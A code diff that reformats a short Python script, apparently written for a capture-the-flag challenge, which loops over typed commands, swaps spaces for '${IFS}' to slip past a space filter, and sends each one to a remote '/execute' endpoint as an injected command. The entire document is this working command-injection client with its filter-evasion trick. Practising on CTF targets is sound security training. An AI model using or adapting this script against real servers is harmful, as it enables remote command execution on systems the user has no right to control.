@@ -1,13 +1,12 @@
+from requests import get, post
 
-from requests import get,post
-
-a=0
-while a!='exit!':
-	a=input('>>> ')
-	b=a.replace(' ','${IFS}')
-	print(f'~~> {b}')
-	resp = get('https://its-broken-b2ibel8m.spbctf.ru/execute', params={'cmd':b})
-	print(resp.text)
+a = 0
+while a != "exit!":
+    a = input(">>> ")
+    b = a.replace(" ", "${IFS}")
+    print(f"~~> {b}")
+    resp = get("https://its-broken-b2ibel8m.spbctf.ru/execute", params={"cmd": b})
+    print(resp.text)
 
 """
 GET /execute?cmd=dir HTTP/2
